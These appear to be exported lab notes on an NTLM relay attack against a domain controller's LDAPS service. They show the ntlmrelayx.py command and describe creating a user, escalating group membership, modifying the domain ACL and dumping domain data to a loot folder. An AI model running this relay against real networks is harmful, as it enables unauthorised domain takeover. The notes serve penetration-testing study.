<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Target LDAP Secure Service</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Target LDAP Secure Service</h1><br/><strong>Target LDAP Secure Service</strong><br /><div class="codebox"><div class="codebox">kali@kali:$&nbsp;cd&nbsp;/usr/share/doc/python3-impacket/examples<br />kali@kali:$&nbsp;python3&nbsp;ntlmrelayx.py&nbsp;-6&nbsp;-wh&nbsp;attackerFox.daniele.local&nbsp;--target&nbsp;ldaps://&lt;IPDomainController&gt;&nbsp;&nbsp;--lootdir&nbsp;lootme</div></div><br />OPTIONS:<br />      ▪  --target&lt;target&gt; → in this case is the LDAP service(port 389) on the Domain Controller.<br />           Most of the time is more likely to use LDAPS( the “S” means Secure ) because most Company have installed the certificate “Active Directory Certificate Services” <br />           <a href=""><img src="images/1255-1.png" alt="images/1255-1.png" /></a><br />      ▪ <a href=""><img src="images/1255-2.png" alt="images/1255-2.png" /></a><br />      ▪ <a href=""><img src="images/1255-3.png" alt="images/1255-3.png" /></a><br /><br /><strong>OUTPUT:</strong><br />    <a href=""><img src="images/1255-4.png" alt="images/1255-4.png" /></a><br />    Now ntlmrelayx.py will check which Privileges this Account(DANIELE\pparker) has and take advantage from it<br />   ◇ Create User privileges found<br />       <a href=""><img src="images/1255-5.png" alt="images/1255-5.png" /></a><br />       <a href=""><img src="images/1255-6.png" alt="images/1255-6.png" /></a><br />        We can check on the target that the user is been added:<br />        <a href=""><img src="images/1255-7.png" alt="images/1255-7.png" /></a><br />        username: HykjyYRePp and password: ~oc(fPL:j2len.}<br />   ◇ Add domain to Admin privileged Group:<br />        <a href=""><img src="images/1255-8.png" alt="images/1255-8.png" /></a><br />   ◇ Modifying domain ACL<br />        <a href=""><img src="images/1255-9.png" alt="images/1255-9.png" /></a><br />   ◇ Dump Domain info in the lootdir directory<br />        <a href=""><img src="images/1255-10.png" alt="images/1255-10.png" /></a><br />        The folder specified in the command(in this case lootme) if not specified differently is been saved in our actual folder<br />        <a href=""><img src="images/1255-11.png" alt="images/1255-11.png" /></a><br />        To view a file we can use Firefox:<br />        <div class="codebox"><div class="codebox">kali@kali:/$&nbsp;firefox&nbsp;domain_users_by_group.html</div></div><br />        <a href=""><img src="images/1255-12.png" alt="images/1255-12.png" /></a><br />   ◇ Restore the ACL: to restore it at before the attack you can use the file with the extension .restore saved in the actual folder<br />        <a href=""><img src="images/1255-13.png" alt="images/1255-13.png" /></a></div>
</body>
</html>
